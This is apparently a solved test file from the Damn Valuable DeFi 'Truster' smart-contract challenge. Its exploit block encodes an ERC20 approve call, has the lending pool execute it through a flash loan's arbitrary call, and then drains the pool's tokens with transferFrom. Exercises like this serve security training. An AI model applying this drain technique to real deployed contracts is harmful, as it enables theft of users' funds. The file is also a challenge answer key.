const { ethers } = require('hardhat');
const { expect } = require('chai');
const { parseEther } = require('ethers/lib/utils');
const { BigNumber } = require('ethers');

describe('[Challenge] Truster', function () {
    let deployer, attacker;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

        this.token = await DamnValuableToken.deploy();
        this.pool = await TrusterLenderPool.deploy(this.token.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal('0');
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */
        // const AttackerContract = await ethers.getContractFactory('AttackerContract', attacker);
        // const attackerContract = await AttackerContract.deploy(this.token.address, this.token.address);

        const abiCoder = new ethers.utils.AbiCoder();
        let encodedAmount = abiCoder.encode(["uint256"], [TOKENS_IN_POOL]);
        let encodedSpender = abiCoder.encode(["address"], [attacker.address]);
        
        console.log("amount: ", abiCoder.decode(["uint256"], encodedAmount).toString());
        console.log("spender: ", abiCoder.decode(["address"], encodedSpender).toString());

        let ABI = [
            "function approve(address spender, uint256 amount) external returns (bool)"
        ];
        let iface = new ethers.utils.Interface(ABI);
        let encodedFunction = iface.encodeFunctionData("approve", [attacker.address, encodedAmount]);

        console.log(iface.decodeFunctionData("approve", encodedFunction));
 
        await this.pool.flashLoan(
            TOKENS_IN_POOL,
            this.pool.address, 
            this.token.address,
            encodedFunction
        ); 
        await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });
});

